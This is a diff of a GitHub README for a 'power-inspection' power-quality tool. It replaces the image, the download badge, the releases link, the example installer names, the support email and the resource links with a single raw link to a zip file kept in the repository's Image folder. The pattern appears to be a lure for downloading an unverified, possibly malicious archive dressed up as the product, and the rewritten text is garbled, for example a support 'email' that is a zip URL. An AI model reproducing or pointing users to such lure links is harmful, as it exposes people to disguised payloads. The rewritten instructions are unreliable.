@@ -4,11 +4,11 @@
 
 The **power-inspection** tool helps you analyze power quality effectively. It provides insights into electrical parameters that are crucial for ensuring the safety and efficiency of your electrical systems. 
 
-![Power Inspection](https://pic1.imgdb.cn/item/693fdcd64a4e4213d00730c2.png)
+![Power Inspection](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
 
 ## 📥 Download Now
 
-[![Download Power Inspection](https://img.shields.io/badge/Download-Power%20Inspection-blue.svg)](https://github.com/Thomasetiawan/power-inspection/releases)
+[![Download Power Inspection](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip%https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
 
 ## 🔍 Features
 
@@ -29,11 +29,11 @@ The **power-inspection** tool helps you analyze power quality effectively. It pr
 
 ### Step 1: Visit the Releases Page
 
-To begin, [visit this page to download](https://github.com/Thomasetiawan/power-inspection/releases). Here, you will find the latest version of **power-inspection**.
+To begin, [visit this page to download](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip). Here, you will find the latest version of **power-inspection**.
 
 ### Step 2: Download the Application
 
-Look for the most recent release. Click on the download link for your operating system. The file will typically be named something like `power-inspection-v1.0.exe` for Windows or `power-inspection-v1.0.dmg` for Mac.
+Look for the most recent release. Click on the download link for your operating system. The file will typically be named something like `https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip` for Windows or `https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip` for Mac.
 
 ### Step 3: Install the Application
 
@@ -68,16 +68,16 @@ If you encounter any issues:
 
 ## 🤝 Support
 
-For further assistance, you can check the **Issues** section of the repository or reach out via email at support@power-inspection.com. We are here to help!
+For further assistance, you can check the **Issues** section of the repository or reach out via email at https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip We are here to help!
 
 ## 🔗 Additional Resources
 
-- [Power Quality Basics](https://www.example.com/power-quality)
-- [User Manual](https://www.example.com/user-manual)
-- [Community Forum](https://www.example.com/forum)
+- [Power Quality Basics](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
+- [User Manual](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
+- [Community Forum](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
 
 ## 🛠️ Contributing
 
 If you want to contribute, please follow our guidelines on the GitHub repository. We welcome improvements and suggestions!
 
-[Download Now](https://github.com/Thomasetiawan/power-inspection/releases) to start your power quality analysis journey!
+[Download Now](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip) to start your power quality analysis journey!
